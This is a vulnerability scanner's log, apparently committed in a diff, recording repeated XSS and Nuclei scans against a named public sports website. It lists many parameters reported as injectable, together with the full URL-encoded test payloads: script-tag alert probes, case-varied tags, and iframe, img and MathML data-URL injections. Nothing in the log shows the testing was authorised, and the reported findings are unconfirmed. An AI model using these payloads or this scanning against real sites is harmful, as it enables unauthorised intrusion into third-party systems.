+2026-03-22 17:21:50,804 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: SPSID (onload)
+2026-03-22 17:21:50,821 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: SPSID (onload_encoded)
+2026-03-22 17:22:46,522 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 17:22:46,522 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 17:22:46,522 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-22 17:22:46,522 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-22 17:23:35,590 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?id=test
+2026-03-22 17:23:35,590 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 17:23:35,590 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:23:37,748 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (basic_script)
+2026-03-22 17:23:38,563 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:23:38,563 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 17:23:52,976 - VulnerabilityScanner - INFO - ✅ Nuclei scan completed with no vulnerabilities
+2026-03-22 17:25:20,499 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 17:25:20,500 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 17:25:20,500 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-22 17:25:20,500 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-22 17:28:20,826 - VulnerabilityScanner - WARNING - ⚠️  No parameters discovered, using common defaults
+2026-03-22 17:28:20,827 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 17:28:20,827 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:28:22,514 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (basic_script)
+2026-03-22 17:28:38,043 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (data_img)
+2026-03-22 17:28:38,224 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (data_url)
+2026-03-22 17:28:41,156 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (mutation_xss)
+2026-03-22 17:28:46,154 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (script_uppercase)
+2026-03-22 17:28:46,161 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (basic_script)
+2026-03-22 17:28:46,849 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (case_variation)
+2026-03-22 17:29:03,771 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (data_img)
+2026-03-22 17:29:04,248 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (data_url)
+2026-03-22 17:29:07,595 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (mutation_xss)
+2026-03-22 17:29:11,632 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (case_variation)
+2026-03-22 17:29:12,099 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (script_uppercase)
+2026-03-22 17:29:12,860 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: search (basic_script)
+2026-03-22 17:29:29,515 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: search (data_img)
+2026-03-22 17:29:30,067 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: search (data_url)
+2026-03-22 17:29:32,176 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: search (mutation_xss)
+2026-03-22 17:29:38,055 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: search (script_uppercase)
+2026-03-22 17:29:38,324 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: name (basic_script)
+2026-03-22 17:29:38,642 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: search (case_variation)
+2026-03-22 17:29:47,664 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?id=test
+2026-03-22 17:29:47,664 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 17:29:47,664 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:29:50,681 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (basic_script)
+2026-03-22 17:29:50,682 - VulnerabilityScanner - INFO -     Test URL: https://big12sports.com/schedule.aspx?id=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 17:29:50,706 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:29:50,707 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 17:29:54,158 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: name (data_url)
+2026-03-22 17:29:54,870 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: name (data_img)
+2026-03-22 17:29:58,487 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: name (mutation_xss)
+2026-03-22 17:30:03,846 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: name (case_variation)
+2026-03-22 17:30:04,297 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: email (basic_script)
+2026-03-22 17:30:04,341 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: name (script_uppercase)
+2026-03-22 17:30:05,150 - VulnerabilityScanner - INFO - ✅ Nuclei scan completed with no vulnerabilities
+2026-03-22 17:30:05,536 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?id=1
+2026-03-22 17:30:05,536 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 17:30:05,536 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:30:08,494 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (basic_script)
+2026-03-22 17:30:08,494 - VulnerabilityScanner - INFO -     Test URL: https://big12sports.com/schedule.aspx?id=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 17:30:08,498 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:30:08,498 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 17:30:20,481 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: email (data_url)
+2026-03-22 17:30:20,757 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: email (data_img)
+2026-03-22 17:30:22,897 - VulnerabilityScanner - INFO - ✅ Nuclei scan completed with no vulnerabilities
+2026-03-22 17:30:23,151 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?id=test
+2026-03-22 17:30:23,152 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 17:30:23,152 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:30:23,407 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: email (mutation_xss)
+2026-03-22 17:30:24,867 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (basic_script)
+2026-03-22 17:30:24,867 - VulnerabilityScanner - INFO -     Test URL: https://big12sports.com/schedule.aspx?id=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 17:30:26,011 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:30:26,012 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 17:30:28,070 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: email (case_variation)
+2026-03-22 17:30:29,184 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: email (script_uppercase)
+2026-03-22 17:30:30,919 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: message (basic_script)
+2026-03-22 17:30:41,258 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?id=1
+2026-03-22 17:30:41,259 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 17:30:41,259 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:30:43,960 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: id (basic_script)
+2026-03-22 17:30:43,961 - VulnerabilityScanner - INFO -     Test URL: https://big12sports.com/schedule.aspx?id=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 17:30:44,162 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:30:44,163 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 17:30:46,008 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: message (data_img)
+2026-03-22 17:30:46,643 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: message (data_url)
+2026-03-22 17:30:49,691 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: message (mutation_xss)
+2026-03-22 17:30:53,727 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: message (case_variation)
+2026-03-22 17:30:54,779 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: message (script_uppercase)
+2026-03-22 17:30:54,876 - VulnerabilityScanner - INFO - ✅ [XSS] Found multi-parameter vulnerability: ['id', 'q', 'search', 'name', 'email']
+2026-03-22 17:30:58,596 - VulnerabilityScanner - INFO - ✅ Nuclei scan completed with no vulnerabilities
+2026-03-22 19:39:30,313 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 19:39:30,313 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 19:39:30,313 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-22 19:39:30,314 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-22 19:41:07,214 - VulnerabilityScanner - INFO - ✅ Discovered 13 parameters: SPID, ATCLID, partner, PALBID, DB_OEM_ID, SPSID, MONITOR_AD_ID, DB_LANG, CURRENT_PAGE, CAT_SPORT_ID
+2026-03-22 19:41:07,215 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain
+2026-03-22 19:41:07,215 - VulnerabilityScanner - INFO - Testing 13 parameter(s)
+2026-03-22 19:41:07,215 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 19:41:08,313 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPID
+2026-03-22 19:41:08,313 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:41:43,374 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPID
+2026-03-22 19:41:43,374 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:41:44,297 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPID
+2026-03-22 19:41:44,298 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:41:51,273 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPID
+2026-03-22 19:41:51,273 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:42:02,260 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPID
+2026-03-22 19:42:02,262 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:42:03,438 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPID
+2026-03-22 19:42:03,439 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:42:06,162 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: ATCLID
+2026-03-22 19:42:06,165 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?ATCLID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:42:44,728 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: ATCLID
+2026-03-22 19:42:44,729 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?ATCLID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:42:45,285 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: ATCLID
+2026-03-22 19:42:45,285 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?ATCLID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:42:50,440 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: ATCLID
+2026-03-22 19:42:50,441 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?ATCLID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:42:59,352 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: ATCLID
+2026-03-22 19:42:59,353 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?ATCLID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:43:01,210 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: ATCLID
+2026-03-22 19:43:01,211 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?ATCLID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:43:02,811 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: partner
+2026-03-22 19:43:02,818 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?partner=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:43:37,582 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: partner
+2026-03-22 19:43:37,583 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?partner=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:43:37,725 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: partner
+2026-03-22 19:43:37,725 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?partner=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:43:43,937 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: partner
+2026-03-22 19:43:43,938 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?partner=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:43:55,816 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: partner
+2026-03-22 19:43:55,822 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?partner=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:43:56,291 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: partner
+2026-03-22 19:43:56,293 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?partner=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:43:56,951 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: PALBID
+2026-03-22 19:43:56,952 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?PALBID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:44:34,444 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: PALBID
+2026-03-22 19:44:34,444 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?PALBID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:44:35,911 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: PALBID
+2026-03-22 19:44:35,911 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?PALBID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:44:42,028 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: PALBID
+2026-03-22 19:44:42,028 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?PALBID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:44:51,258 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: PALBID
+2026-03-22 19:44:51,259 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?PALBID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:44:51,551 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: PALBID
+2026-03-22 19:44:51,553 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?PALBID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:44:51,992 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_OEM_ID
+2026-03-22 19:44:51,998 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_OEM_ID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:45:26,287 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_OEM_ID
+2026-03-22 19:45:26,287 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_OEM_ID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:45:29,070 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_OEM_ID
+2026-03-22 19:45:29,070 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_OEM_ID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:45:34,386 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_OEM_ID
+2026-03-22 19:45:34,387 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_OEM_ID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:45:45,104 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPSID
+2026-03-22 19:45:45,107 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPSID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:45:45,639 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_OEM_ID
+2026-03-22 19:45:45,642 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_OEM_ID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:45:45,903 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_OEM_ID
+2026-03-22 19:45:45,907 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_OEM_ID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:46:20,139 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPSID
+2026-03-22 19:46:20,139 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPSID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:46:20,175 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPSID
+2026-03-22 19:46:20,176 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPSID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:46:27,813 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPSID
+2026-03-22 19:46:27,814 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPSID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:46:47,790 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPSID
+2026-03-22 19:46:47,791 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPSID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:46:52,478 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: SPSID
+2026-03-22 19:46:52,481 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?SPSID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:46:54,658 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: MONITOR_AD_ID
+2026-03-22 19:46:54,659 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?MONITOR_AD_ID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:48:56,533 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: MONITOR_AD_ID
+2026-03-22 19:48:56,542 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?MONITOR_AD_ID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:48:59,755 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: MONITOR_AD_ID
+2026-03-22 19:48:59,756 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?MONITOR_AD_ID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:49:18,392 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: MONITOR_AD_ID
+2026-03-22 19:49:18,393 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?MONITOR_AD_ID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:49:57,545 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: MONITOR_AD_ID
+2026-03-22 19:49:57,547 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?MONITOR_AD_ID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:49:59,670 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: MONITOR_AD_ID
+2026-03-22 19:49:59,674 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?MONITOR_AD_ID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:50:04,715 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_LANG
+2026-03-22 19:50:04,716 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_LANG=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:51:03,499 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_LANG
+2026-03-22 19:51:03,500 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_LANG=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:51:05,071 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_LANG
+2026-03-22 19:51:05,072 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_LANG=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:51:10,692 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_LANG
+2026-03-22 19:51:10,692 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_LANG=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:51:20,853 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_LANG
+2026-03-22 19:51:20,854 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_LANG=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:51:21,711 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: DB_LANG
+2026-03-22 19:51:21,713 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?DB_LANG=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:51:21,933 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CURRENT_PAGE
+2026-03-22 19:51:21,937 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CURRENT_PAGE=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:51:57,692 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CURRENT_PAGE
+2026-03-22 19:51:57,692 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CURRENT_PAGE=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:51:58,618 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CURRENT_PAGE
+2026-03-22 19:51:58,618 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CURRENT_PAGE=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:52:03,432 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CURRENT_PAGE
+2026-03-22 19:52:03,432 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CURRENT_PAGE=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:52:12,801 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CURRENT_PAGE
+2026-03-22 19:52:12,803 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CURRENT_PAGE=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:52:14,506 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CAT_SPORT_ID
+2026-03-22 19:52:14,507 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CAT_SPORT_ID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:52:15,217 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CURRENT_PAGE
+2026-03-22 19:52:15,220 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CURRENT_PAGE=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:52:48,857 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CAT_SPORT_ID
